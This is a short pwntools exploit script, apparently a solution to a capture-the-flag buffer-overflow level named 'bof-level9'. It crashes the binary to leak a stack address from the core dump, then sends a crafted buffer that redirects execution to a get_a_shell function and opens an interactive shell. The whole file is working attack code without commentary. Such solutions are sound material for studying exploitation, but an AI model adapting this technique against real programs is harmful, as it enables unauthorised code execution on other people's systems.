#!/usr/bin/env python

from pwn import *

p = process('./bof-level9')
e = ELF('./bof-level9')

get_a_shell = e.symbols['get_a_shell']


buf = p32(get_a_shell) * (128/4) + p32(0)

p.sendline(buf)
p.wait()
p.close()

c = Core('./core')

addr = c.stack.find(buf)


exploit_buf = p32(get_a_shell) * (127/4) + p32(addr+4)

p = process('./bof-level9')
p.sendline(exploit_buf)
p.interactive()
